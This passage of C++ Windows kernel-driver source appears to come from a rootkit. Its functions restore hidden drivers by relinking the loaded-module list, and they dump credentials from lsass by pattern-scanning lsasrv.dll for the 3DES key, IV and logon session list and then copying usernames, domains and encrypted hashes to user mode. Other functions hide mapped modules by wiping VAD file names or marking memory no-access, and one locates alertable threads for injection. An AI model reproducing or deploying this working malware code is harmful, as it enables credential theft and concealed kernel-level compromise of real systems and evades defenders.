* UnhideDriver is responsible for restoring a kernel driver.
*
* Parameters:
* @driverPath [_In_ wchar_t*] -- Required information, contains the driver's information.
*
* Returns:
* @status	  [NTSTATUS]	  -- Whether successfuly unhidden or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::UnhideDriver(_In_ wchar_t* driverPath) {
	PKLDR_DATA_TABLE_ENTRY loadedModulesEntry = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	HiddenDriverEntry* driverEntry = nullptr;

	if (!FindHiddenDriver(driverPath, &driverEntry))
		return STATUS_NOT_FOUND;

	if (!ExAcquireResourceExclusiveLite(PsLoadedModuleResource, 1))
		return STATUS_ABANDONED;

	PLIST_ENTRY pListEntry = PsLoadedModuleList->InLoadOrderLinks.Flink;
	loadedModulesEntry = CONTAINING_RECORD(pListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
	InsertTailList(&loadedModulesEntry->InLoadOrderLinks, reinterpret_cast<PLIST_ENTRY>(driverEntry->OriginalEntry));

	if (!RemoveListEntry(&hiddenDrivers, driverEntry))
		status = STATUS_UNSUCCESSFUL;

	ExReleaseResourceLite(PsLoadedModuleResource);
	return status;
}

/*
* Description:
* DumpCredentials is responsible for dumping credentials from lsass.
*
* Parameters:
* allocationSize [_Out_ SIZE_T*] -- Size to allocate for credentials buffer.
*
* Returns:
* @status		 [NTSTATUS]		 -- Whether successfuly dumped or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::DumpCredentials(_Out_ SIZE_T* allocationSize) {
	NTSTATUS status = STATUS_SUCCESS;
	KAPC_STATE state;
	SIZE_T bytesWritten = 0;
	PEPROCESS lsass = nullptr;
	ULONG credentialsIndex = 0;
	ULONG validCredentialsCount = 0;
	ULONG credentialsCount = 0;
	PLSASRV_CREDENTIALS currentCredentials = nullptr;

	if (!allocationSize)
		return STATUS_INVALID_PARAMETER;

	if (cachedLsassInfo.Count != 0)
		return STATUS_ABANDONED;

	if (!lsassMetadata.Collected) {
		status = GetLsassMetadata(lsass);
		lsassMetadata.Collected = NT_SUCCESS(status);

		if (!lsassMetadata.Collected)
			return status;
	}
	AutoLock locker(lsassMetadata.Lock);

	KeStackAttachProcess(lsass, &state);
	do {
		AutoLock cacheLock(cachedLsassInfo.Lock);
		cachedLsassInfo.DesKey.Size = lsassMetadata.DesKey->hKey->key->hardkey.cbSecret;
		cachedLsassInfo.DesKey.Data = AllocateMemory<PVOID>(cachedLsassInfo.DesKey.Size);

		if (!cachedLsassInfo.DesKey.Data) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		status = MmCopyVirtualMemory(lsass, lsassMetadata.DesKey->hKey->key->hardkey.data, IoGetCurrentProcess(),
			cachedLsassInfo.DesKey.Data, cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);

		if (!NT_SUCCESS(status))
			break;

		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);

		// Getting the real amount of credentials.
		while (currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList)) {
			credentialsCount++;
			currentCredentials = currentCredentials->Flink;
		}

		if (credentialsCount == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}
		cachedLsassInfo.Creds = AllocateMemory<IoctlCredentials*>(credentialsCount * sizeof(IoctlCredentials));

		if (!cachedLsassInfo.Creds) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		currentCredentials = reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList->Flink);

		// Getting the interesting information.
		for (credentialsIndex = 0; credentialsIndex < credentialsCount && 
			currentCredentials != reinterpret_cast<PLSASRV_CREDENTIALS>(lsassMetadata.LogonSessionList);
			credentialsIndex++, currentCredentials = currentCredentials->Flink) {

			if (currentCredentials->UserName.Length == 0 || !currentCredentials->Credentials)
				continue;

			if (!currentCredentials->Credentials->PrimaryCredentials)
				continue;

			if (currentCredentials->Credentials->PrimaryCredentials->Credentials.Length == 0)
				continue;

			cachedLsassInfo.Creds[credentialsIndex].Username.Buffer = NULL;
			status = CopyUnicodeString(lsass, &currentCredentials->UserName, IoGetCurrentProcess(),
				&cachedLsassInfo.Creds[credentialsIndex].Username, KernelMode);
			
			if (!NT_SUCCESS(status))
				break;

			cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer = NULL;
			status = CopyUnicodeString(lsass, &currentCredentials->Domain, IoGetCurrentProcess(),
				&cachedLsassInfo.Creds[credentialsIndex].Domain, KernelMode);

			if (!NT_SUCCESS(status)) {
				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
				break;
			}

			cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer = NULL;
			status = CopyUnicodeString(lsass, &currentCredentials->Credentials->PrimaryCredentials->Credentials,
				IoGetCurrentProcess(), &cachedLsassInfo.Creds[credentialsIndex].EncryptedHash, KernelMode);
			
			if (!NT_SUCCESS(status)) {
				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
				break;
			}
			validCredentialsCount++;
		}

	} while (false);
	KeUnstackDetachProcess(&state);

	if (!NT_SUCCESS(status)) {
		if (credentialsIndex > 0) {
			for (ULONG i = 0; i < credentialsIndex; i++) {
				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].EncryptedHash.Buffer);
				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Domain.Buffer);
				FreeVirtualMemory(cachedLsassInfo.Creds[credentialsIndex].Username.Buffer);
			}
		}

		if (cachedLsassInfo.Creds)
			FreeVirtualMemory(cachedLsassInfo.Creds);

		if (cachedLsassInfo.DesKey.Data)
			FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
	}
	else {
		cachedLsassInfo.Count = validCredentialsCount;
		*allocationSize = validCredentialsCount;
	}

	if (lsass)
		ObDereferenceObject(lsass);

	return status;
}

/*
* Description:
* GetLsassMetadata is responsible for collecting all the required information from lsass in order to decrypt credentials.
* 
* Parameters:
* @lsass  [_Inout_ PEPROCESS&] -- The EPROCESS of lsass.
* 
* Returns:
* @status [NTSTATUS]		   -- Whether successfuly collected or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::GetLsassMetadata(_Inout_ PEPROCESS& lsass) {
	KAPC_STATE state;
	ULONG lsassPid = 0;
	ULONG foundIndex = 0;
	PVOID lsasrvMain = nullptr;
	PVOID lsaIGetNbAndDnsDomainNames = nullptr;
	WCHAR* mainDriveLetter = nullptr;
	const WCHAR lsasrvDll[] = L"\\Windows\\System32\\lsasrv.dll";
	MemoryAllocator<WCHAR*> fullPath((DRIVE_LETTER_SIZE + wcslen(lsasrvDll)) * sizeof(WCHAR));

	if (!fullPath.IsValid())
		return STATUS_INSUFFICIENT_RESOURCES;

	auto AlignAddress = [](ULONGLONG Address) -> ULONGLONG {
		ULONG remain = Address % 8;
		return remain != 0 ? Address + 8 - remain : Address;
	};

	AutoLock locker(lsassMetadata.Lock);

	if (lsassMetadata.Collected)
		return STATUS_SUCCESS;

	__try {
		lsassPid = FindPidByName(L"lsass.exe");
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		return GetExceptionCode();
	}

	NTSTATUS status = PsLookupProcessByProcessId(ULongToHandle(lsassPid), &lsass);

	if (!NT_SUCCESS(status))
		return status;

	IrqlGuard irqlGuard(PASSIVE_LEVEL);
	__try {
		mainDriveLetter = GetMainDriveLetter();
		errno_t err = wcscpy_s(fullPath.Get(), DRIVE_LETTER_SIZE * sizeof(WCHAR), mainDriveLetter);

		if (err != 0)
			ExRaiseStatus(STATUS_INVALID_PARAMETER);
		err = wcscat_s(fullPath.Get(), wcslen(lsasrvDll) * sizeof(WCHAR), lsasrvDll);

		if (err != 0)
			ExRaiseStatus(STATUS_INVALID_PARAMETER);
		lsasrvMain = GetUserModeFuncAddress("LsaIAuditSamEvent", fullPath.Get(), lsassPid);
		lsaIGetNbAndDnsDomainNames = GetUserModeFuncAddress("LsaIGetNbAndDnsDomainNames", fullPath.Get(), lsassPid);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		FreeVirtualMemory(mainDriveLetter);
		ObDereferenceObject(lsass);
		return GetExceptionCode();
	}
	FreeVirtualMemory(mainDriveLetter);
	irqlGuard.UnsetIrql();

	KeStackAttachProcess(lsass, &state);
	do {
		PVOID lsaInitializeProtectedMemory = FindPattern(IvDesKeyLocationPattern, lsasrvMain, IvDesKeyLocationDistance, 0, UserMode);

		if (!lsaInitializeProtectedMemory) {
			status = STATUS_NOT_FOUND;
			break;
		}
		// Getting the IV
		PLONG ivAddressOffset = static_cast<PLONG>(FindPattern(IvSignaturePattern, lsaInitializeProtectedMemory, 
			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));

		if (!ivAddressOffset) {
			status = STATUS_NOT_FOUND;
			break;
		}
		lsassMetadata.IvAddress = static_cast<PVOID>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
			(*ivAddressOffset) + foundIndex);

		// Getting 3DES key
		PLONG desKeyAddressOffset = static_cast<PLONG>(FindPattern(DesKeySignaturePattern, lsaInitializeProtectedMemory, 
			LsaInitializeProtectedMemoryDistance, &foundIndex, UserMode));

		if (!desKeyAddressOffset) {
			status = STATUS_NOT_FOUND;
			break;
		}
		PBCRYPT_GEN_KEY desKey = reinterpret_cast<PBCRYPT_GEN_KEY>(static_cast<PUCHAR>(lsaInitializeProtectedMemory) +
			(*desKeyAddressOffset) + foundIndex + DesKeyStructOffset);
		status = ProbeAddress(desKey, sizeof(BCRYPT_GEN_KEY), sizeof(BCRYPT_GEN_KEY));

		if (!NT_SUCCESS(status))
			break;

		if (desKey->hKey->tag != DES_KEY_TAG1 || desKey->hKey->key->tag != DES_KEY_TAG2) {
			status = STATUS_NOT_FOUND;
			break;
		}
		lsassMetadata.DesKey = AllocateMemory<PBCRYPT_GEN_KEY>(sizeof(BCRYPT_GEN_KEY));

		if (!lsassMetadata.DesKey) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}
		lsassMetadata.DesKey->cbKey = desKey->cbKey;
		lsassMetadata.DesKey->hProvider = desKey->hProvider;
		lsassMetadata.DesKey->hKey = desKey->hKey;
		lsassMetadata.DesKey->pKey = desKey->pKey;

		// Getting LogonSessionList
		PLONG logonSessionListAddressOffset = static_cast<PLONG>(FindPatterns(LogonSessionListPatterns, 
			LogonSessionListPatternCount, lsaIGetNbAndDnsDomainNames, LogonSessionListDistance,
			&foundIndex, UserMode));

		if (!logonSessionListAddressOffset) {
			status = STATUS_NOT_FOUND;
			break;
		}

		PLIST_ENTRY logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(static_cast<PUCHAR>(lsaIGetNbAndDnsDomainNames) +
			(*logonSessionListAddressOffset) + foundIndex);

		logonSessionListAddress = reinterpret_cast<PLIST_ENTRY>(AlignAddress(reinterpret_cast<ULONGLONG>(logonSessionListAddress)));

		status = ProbeAddress(logonSessionListAddress, sizeof(PLSASRV_CREDENTIALS), sizeof(PLSASRV_CREDENTIALS));

		if (!NT_SUCCESS(status))
			break;
		lsassMetadata.LogonSessionList = logonSessionListAddress;
		lsassMetadata.Collected = true;
	} while (false);
	KeUnstackDetachProcess(&state);

	if (!NT_SUCCESS(status))
		FreeVirtualMemory(lsassMetadata.DesKey);
	return status;
}

/*
* Description:
* GetCredentials is responsible for getting credentials from lsass.
*
* Parameters:
* @credentials [_Inout_ IoctlCredentials*] -- Credential entry to get from the cachedLsassInfo.
*
* Returns:
* @status	 [NTSTATUS]			 -- Whether successfuly sent or not.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::GetCredentials(_Inout_ IoctlCredentialsInformation* credentials) {
	SIZE_T bytesWritten = 0;
	SIZE_T i = 0;
	NTSTATUS status = STATUS_SUCCESS;

	if (!credentials)
		return STATUS_INVALID_PARAMETER;
	AutoLock lock(cachedLsassInfo.Lock);

	if (credentials->Count != cachedLsassInfo.Count) {
		credentials->Count = cachedLsassInfo.Count;
		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
		return STATUS_SUCCESS;
	}
	if (credentials->DesKey.Size != cachedLsassInfo.DesKey.Size) {
		credentials->DesKey.Size = cachedLsassInfo.DesKey.Size;
		return STATUS_SUCCESS;
	}
	if (credentials->Iv.Size != cachedLsassInfo.Iv.Size) {
		credentials->Iv.Size = cachedLsassInfo.Iv.Size;
		return STATUS_SUCCESS;
	}

	MemoryGuard desKeyGuard(credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, UserMode);
	MemoryGuard ivGuard(credentials->Iv.Data, cachedLsassInfo.Iv.Size, UserMode);
	MemoryGuard credentialGuard(credentials->Creds, static_cast<ULONG>(sizeof(IoctlCredentials) * cachedLsassInfo.Count), UserMode);

	if (!desKeyGuard.IsValid() || !credentialGuard.IsValid() || !ivGuard.IsValid())
		return STATUS_INVALID_ADDRESS;
	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.DesKey.Data,
		IoGetCurrentProcess(), credentials->DesKey.Data, cachedLsassInfo.DesKey.Size, KernelMode, &bytesWritten);

	if (!NT_SUCCESS(status))
		return status;

	status = MmCopyVirtualMemory(IoGetCurrentProcess(), cachedLsassInfo.Iv.Data,
		IoGetCurrentProcess(), credentials->Iv.Data, cachedLsassInfo.Iv.Size, KernelMode, &bytesWritten);

	if (!NT_SUCCESS(status))
		return status;

	for (i = 0; i < credentials->Count; i++) {
		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Username, IoGetCurrentProcess(),
			&credentials->Creds[i].Username, UserMode);

		if (!NT_SUCCESS(status))
			break;
		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].Domain, IoGetCurrentProcess(),
			&credentials->Creds[i].Domain, UserMode);

		if (!NT_SUCCESS(status))
			break;
		status = CopyUnicodeString(IoGetCurrentProcess(), &credentials->Creds[i].EncryptedHash, IoGetCurrentProcess(),
			&credentials->Creds[i].EncryptedHash, UserMode);

		if (!NT_SUCCESS(status))
			break;
	}
	if (!NT_SUCCESS(status)) {
		for (size_t j = 0; j <= i; j++) {
			FreeVirtualMemory(credentials->Creds[j].Username.Buffer);
			FreeVirtualMemory(credentials->Creds[j].Domain.Buffer);
			FreeVirtualMemory(credentials->Creds[j].EncryptedHash.Buffer);
		}
		return status;
	}

	cachedLsassInfo.Count = 0;
	FreeVirtualMemory(cachedLsassInfo.Creds);
	FreeVirtualMemory(cachedLsassInfo.DesKey.Data);
	FreeVirtualMemory(cachedLsassInfo.Iv.Data);
	return status;
}

/*
* Description:
* VadRestoreObject is responsible for restoring a specific node inside a VAD tree.
* 
* Parameters:
* @process			[_Inout_ PEPROCESS]		-- Target to process to search on its VAD.
* @vadNode			[_In_ PMMVAD_SHORT]		-- The VAD node to restore.
* @moduleName		[_In_opt_ wchar_t*]		-- The module name to restore, required if the node is an image map.
* @vadProtection	[_In_opt_ ULONG]		-- The protection to restore, required if the node is a physical memory map.
* 
* Returns:
* @status			[NTSTATUS]				-- STATUS_SUCCESS is restored else error.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
NTSTATUS MemoryHandler::VadRestoreObject(_Inout_ PEPROCESS process, _In_ PMMVAD_SHORT vadNode, _In_opt_ wchar_t* moduleName,
	_In_opt_ ULONG vadProtection) {
	NTSTATUS status = STATUS_INVALID_PARAMETER;

	if (!process || !vadNode || (!moduleName && vadProtection == NO_ACCESS))
		return status;

	if (vadNode->u.VadFlags.VadType == VadImageMap) {
		if (!moduleName)
			return STATUS_INVALID_PARAMETER;
		PMMVAD longNode = reinterpret_cast<PMMVAD>(vadNode);

		if (!longNode->Subsection)
			return STATUS_INVALID_ADDRESS;

		if (!longNode->Subsection->ControlArea || !longNode->Subsection->ControlArea->FilePointer.Object)
			return STATUS_INVALID_ADDRESS;

		PFILE_OBJECT fileObject = reinterpret_cast<PFILE_OBJECT>(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);
		errno_t err = wcscpy_s(fileObject->FileName.Buffer, fileObject->FileName.MaximumLength * sizeof(wchar_t), moduleName);

		if (err != 0)
			return STATUS_UNSUCCESSFUL;

		status = STATUS_SUCCESS;
	}
	else if (vadNode->u.VadFlags.VadType == VadDevicePhysicalMemory) {
		if (vadProtection == NO_ACCESS)
			return STATUS_INVALID_PARAMETER;
		vadNode->u.VadFlags.Protection = vadProtection;
		status = STATUS_SUCCESS;
	}
	return status;
}

/*
* Description:
* VadHideObject is responsible for hiding a specific node inside a VAD tree.
*
* Parameters:
* @process			 [_Inout_ PEPROCESS]		  -- Target to process to search on its VAD.
* @targetAddress	 [_In_ ULONG_PTR]			  -- Virtual address of the module to hide.
* @moduleEntry		 [_Inout_ HiddenModuleEntry&] -- The module entry to fill in order to restore it later.
*
* Returns:
* @status			 [NTSTATUS]			 -- STATUS_SUCCESS is hidden else error.
*/
_IRQL_requires_max_(APC_LEVEL)
NTSTATUS MemoryHandler::VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR targetAddress, _Inout_ HiddenModuleEntry& moduleEntry) {
	PRTL_BALANCED_NODE node = NULL;
	PMMVAD_SHORT shortNode = NULL;
	PMMVAD longNode = NULL;
	NTSTATUS status = STATUS_INVALID_PARAMETER;
	ULONG_PTR targetAddressStart = targetAddress >> PAGE_SHIFT;

	if (!process || targetAddress == 0)
		return status;

	// Finding the VAD node associated with the target address.
	ULONG vadRootOffset = GetVadRootOffset();
	ULONG pageCommitmentLockOffset = GetPageCommitmentLockOffset();

	if (vadRootOffset == 0 || pageCommitmentLockOffset == 0)
		return STATUS_INVALID_ADDRESS;

	PRTL_AVL_TABLE vadTable = *reinterpret_cast<PRTL_AVL_TABLE*>(reinterpret_cast<PUCHAR>(process) + vadRootOffset);
	EX_PUSH_LOCK pageTableCommitmentLock = reinterpret_cast<EX_PUSH_LOCK>(reinterpret_cast<PUCHAR>(process) + pageCommitmentLockOffset);
	TABLE_SEARCH_RESULT res = VadFindNodeOrParent(vadTable, targetAddressStart, &pageTableCommitmentLock, &node);

	if (res != TableFoundNode)
		return STATUS_NOT_FOUND;

	shortNode = reinterpret_cast<PMMVAD_SHORT>(node);
	moduleEntry.VadNode = shortNode;

	// Hiding the image name or marking the area as no access.
	if (shortNode->u.VadFlags.VadType == VadImageMap) {
		longNode = reinterpret_cast<PMMVAD>(shortNode);

		if (!longNode->Subsection)
			return STATUS_INVALID_ADDRESS;

		if (!longNode->Subsection->ControlArea || !longNode->Subsection->ControlArea->FilePointer.Object)
			return STATUS_INVALID_ADDRESS;

		PFILE_OBJECT fileObject = reinterpret_cast<PFILE_OBJECT>(longNode->Subsection->ControlArea->FilePointer.Value & ~0xF);

		if (fileObject->FileName.Length > 0) {
			moduleEntry.VadModuleName = AllocateMemory<WCHAR*>(fileObject->FileName.MaximumLength + sizeof(wchar_t));

			if (!moduleEntry.VadModuleName)
				return STATUS_INSUFFICIENT_RESOURCES;
			errno_t err = wcscpy_s(moduleEntry.VadModuleName, fileObject->FileName.Length + sizeof(wchar_t), fileObject->FileName.Buffer);

			if (err != 0) {
				FreeVirtualMemory(moduleEntry.VadModuleName);
				return STATUS_UNSUCCESSFUL;
			}
			RtlSecureZeroMemory(fileObject->FileName.Buffer, fileObject->FileName.Length);
		}
		status = STATUS_SUCCESS;
	}
	else if (shortNode->u.VadFlags.VadType == VadDevicePhysicalMemory) {
		moduleEntry.OriginalVadProtection = shortNode->u.VadFlags.Protection;
		shortNode->u.VadFlags.Protection = NO_ACCESS;
		status = STATUS_SUCCESS;
	}
	return status;
}

/*
* Description:
* VadFindNodeOrParent is responsible for finding a node inside the VAD tree.
*
* Parameters:
* @table				   [_In_ PRTL_AVL_TABLE]	   -- The table to search for the specific
* @targetPageAddress	   [_In_ ULONG_PTR]			   -- The start page address of the searched mapped object.
* @pageTableCommitmentLock [_Inout_ EX_PUSH_LOCK*]	   -- The lock to acquire before searching the tree.
* @outNode				   [_Out_ PRTL_BALANCED_NODE*] -- NULL if wasn't find, else the result described in the Returns section.
*
* Returns:
* @result				   [TABLE_SEARCH_RESULT] --
* TableEmptyTree if the tree was empty
* TableFoundNode if the key is found and the OutNode is the result node
* TableInsertAsLeft / TableInsertAsRight if the node was not found and the OutNode contains what will be the out node (right or left respectively).
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
TABLE_SEARCH_RESULT MemoryHandler::VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table, _In_ ULONG_PTR targetPageAddress,
	_Inout_ EX_PUSH_LOCK* pageTableCommitmentLock, _Out_ PRTL_BALANCED_NODE* outNode) {
	PRTL_BALANCED_NODE child = NULL;
	PRTL_BALANCED_NODE nodeToCheck = NULL;
	PMMVAD_SHORT virtualAddressToCompare = NULL;
	ULONG_PTR startAddress = 0;
	ULONG_PTR endAddress = 0;
	TABLE_SEARCH_RESULT result = TableEmptyTree;

	if (!table || !outNode || !pageTableCommitmentLock)
		return result;
	ExAcquirePushLockExclusiveEx(pageTableCommitmentLock, 0);

	if (table->NumberGenericTableElements == 0 && table->DepthOfTree == 0) {
		ExReleasePushLockExclusiveEx(pageTableCommitmentLock, 0);
		return result;
	}

	nodeToCheck = reinterpret_cast<PRTL_BALANCED_NODE>(&table->BalancedRoot);

	while (true) {
		if (!nodeToCheck)
			break;

		virtualAddressToCompare = reinterpret_cast<PMMVAD_SHORT>(nodeToCheck);
		startAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpn);
		endAddress = static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpn);

		startAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->StartingVpnHigh) << VPN_SHIFT;
		endAddress |= static_cast<ULONG_PTR>(virtualAddressToCompare->EndingVpnHigh) << VPN_SHIFT;

		if (targetPageAddress < startAddress) {
			child = nodeToCheck->Left;

			if (child) {
				nodeToCheck = child;
				continue;
			}
			*outNode = nodeToCheck;
			result = TableInsertAsLeft;
			break;
		}
		else if (targetPageAddress <= endAddress) {
			*outNode = nodeToCheck;
			result = TableFoundNode;
			break;
		}
		else {
			child = nodeToCheck->Right;

			if (child) {
				nodeToCheck = child;
				continue;
			}

			*outNode = nodeToCheck;
			result = TableInsertAsRight;
			break;
		}
	}
	ExReleasePushLockExclusiveEx(pageTableCommitmentLock, 0);
	return result;
}

/*
* Description:
* FindAlertableThread is responsible for finding an alertable thread within a process.
*
* Parameters:
* @pid		  [_In_ HANDLE] -- The process id to search on.
*
* Returns:
* @thread	  [PETHREAD]	-- PETHREAD object if found, else exception.
*/
_IRQL_requires_max_(APC_LEVEL)
PETHREAD MemoryHandler::FindAlertableThread(_In_ HANDLE pid) {
	ULONG alertableThread = 0;
	ULONG guiThread = 0;
	PETHREAD targetThread = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	ULONG infoSize = 0;

	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		FreeVirtualMemory(info);
		info = AllocateMemory<PSYSTEM_PROCESS_INFO>(infoSize);

		if (!info) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		status = ZwQuerySystemInformation(SystemProcessInformation, info, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !info) {
		FreeVirtualMemory(info);
		ExRaiseStatus(status);
	}
	originalInfo = info;
	status = STATUS_NOT_FOUND;

	// Iterating the processes information until our pid is found.
	while (info->NextEntryOffset) {
		if (info->UniqueProcessId == pid) {
			status = STATUS_SUCCESS;
			break;
		}
		info = reinterpret_cast<PSYSTEM_PROCESS_INFO>(reinterpret_cast<PUCHAR>(info) + info->NextEntryOffset);
	}

	if (!NT_SUCCESS(status)) {
		FreeVirtualMemory(originalInfo);
		ExRaiseStatus(status);
	}

	// Finding a suitable thread.
	for (ULONG i = 0; i < info->NumberOfThreads; i++) {
		if (info->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId())
			continue;
		status = PsLookupThreadByThreadId(info->Threads[i].ClientId.UniqueThread, &targetThread);

		if (!NT_SUCCESS(status))
			continue;

		if (PsIsThreadTerminating(targetThread)) {
			ObDereferenceObject(targetThread);
			targetThread = NULL;
			continue;
		}

		guiThread = *reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + GUI_THREAD_FLAG_OFFSET) & 
			GUI_THREAD_FLAG_BIT;
		alertableThread = *reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + ALERTABLE_THREAD_FLAG_OFFSET) & 
			ALERTABLE_THREAD_FLAG_BIT;

		if (guiThread != 0 ||
			alertableThread == 0 ||
			*reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + THREAD_KERNEL_STACK_OFFSET) == 0 ||
			*reinterpret_cast<PULONG64>(reinterpret_cast<PUCHAR>(targetThread) + THREAD_CONTEXT_STACK_POINTER_OFFSET) == 0) {
			ObDereferenceObject(targetThread);
			targetThread = NULL;
			continue;
		}
		break;
	}
	FreeVirtualMemory(originalInfo);

	if (!targetThread)
		ExRaiseStatus(STATUS_NOT_FOUND);
	return targetThread;
}

/*
* Description:
* FindHiddenModule is responsible for finding a hidden module entry by module entry information.
*
* Parameters:
* @info [_In_ IoctlHiddenModuleInfo&] -- Module entry information containing PID and module name to search for.
*
* Returns:
* @item [HiddenModuleEntry*]		  -- Pointer to the hidden module entry if found, else exception is raised.
*/
_IRQL_requires_max_(APC_LEVEL)
HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ IoctlHiddenModuleInfo& info) const {
	if (!info.ModuleName || !IsValidPath(info.ModuleName) || info.Pid <= SYSTEM_PROCESS_PID)
		ExRaiseStatus(STATUS_INVALID_PARAMETER);

	auto finder = [](_In_ const HiddenModuleEntry* item, _In_ IoctlHiddenModuleInfo& infoToSearch) {
		if (wcslen(item->ModuleName) != wcslen(infoToSearch.ModuleName) || item->Pid != infoToSearch.Pid)
			return false;
		return _wcsicmp(item->ModuleName, infoToSearch.ModuleName) == 0;
	};
	HiddenModuleEntry* item = FindListEntry<HiddenItemsList, HiddenModuleEntry, IoctlHiddenModuleInfo&>(hiddenModules, info, finder);

	if (!item)
		ExRaiseStatus(STATUS_NOT_FOUND);
	return item;
}

/*
* Description:
* FindHiddenModule is responsible for finding a hidden module entry by module entry information.
*
* Parameters:
* @info [_In_ HiddenModuleEntry&] -- Module entry information containing PID and module name to search for.
*
* Returns:
* @item [HiddenModuleEntry*]      -- Pointer to the hidden module entry if found, else exception is raised.
*/
_IRQL_requires_max_(APC_LEVEL)
HiddenModuleEntry* MemoryHandler::FindHiddenModule(_In_ HiddenModuleEntry& info) const {
	if (!IsValidPath(info.ModuleName) || info.Pid <= SYSTEM_PROCESS_PID)
		ExRaiseStatus(STATUS_INVALID_PARAMETER);

	auto finder = [](_In_ const HiddenModuleEntry* item, _In_ HiddenModuleEntry& infoToSearch) {
		if (wcslen(item->ModuleName) != wcslen(infoToSearch.ModuleName) || item->Pid != infoToSearch.Pid)
			return false;
		return _wcsicmp(item->ModuleName, infoToSearch.ModuleName) == 0;
		};
	HiddenModuleEntry* item = FindListEntry<HiddenItemsList, HiddenModuleEntry, HiddenModuleEntry&>(hiddenModules, info, finder);

	if (!item)
		ExRaiseStatus(STATUS_NOT_FOUND);
	return item;
}

/*
* Description:
* FindHiddenDriver is responsible for searching if an item exists in the list of hidden drivers.
*
* Parameters:
* @item	  [HiddenDriverItem*] -- Driver to search for.
*
* Returns:
* @status [ULONG]			  -- If found the index else ITEM_NOT_FOUND.
*/
_IRQL_requires_max_(DISPATCH_LEVEL)
bool MemoryHandler::FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry** driverEntry) const {
	if (!driverPath || !IsValidPath(driverPath))
		return false;

	auto finder = [](_In_ const HiddenDriverEntry* item, _In_ wchar_t* driverPath) {
		return _wcsicmp(item->DriverPath, driverPath) == 0;
	};
	HiddenDriverEntry* item = FindListEntry<HiddenItemsList, HiddenDriverEntry, wchar_t*>(hiddenDrivers, driverPath, finder);

	if (!item)
		return false;

	if (driverEntry)
		*driverEntry = item;
	return true;
}

/*
* Description:
* AddHiddenModule is responsible for adding an item to the list of hidden modules.
* 
* Parameters:
* @item	  [_Inout_ HiddenModuleEntry&] -- Module to add.
* 
* Returns:
* @bool								   -- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool MemoryHandler::AddHiddenModule(_Inout_ HiddenModuleEntry& item) {
	HiddenModuleEntry* entry = nullptr;

	if (!IsValidPath(item.ModuleName) || item.Pid <= SYSTEM_PROCESS_PID)
		return false;

	__try {
		entry = FindHiddenModule(item);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		if (GetExceptionCode() != STATUS_NOT_FOUND)
			return false;
	}

	if (entry)
		return false;
	entry = AllocateMemory<HiddenModuleEntry*>(sizeof(HiddenModuleEntry));

	if (!entry)
		return false;
	entry->ModuleName = item.ModuleName;
	entry->VadModuleName = item.VadModuleName;
	entry->Pid = item.Pid;
	entry->OriginalVadProtection = item.OriginalVadProtection;
	entry->OriginalEntry = item.OriginalEntry;
	entry->VadNode = item.VadNode;
	entry->Links.HashLinks = item.Links.HashLinks;
	entry->Links.InInitializationOrderLinks = item.Links.InInitializationOrderLinks;
	entry->Links.InLoadOrderLinks = item.Links.InLoadOrderLinks;
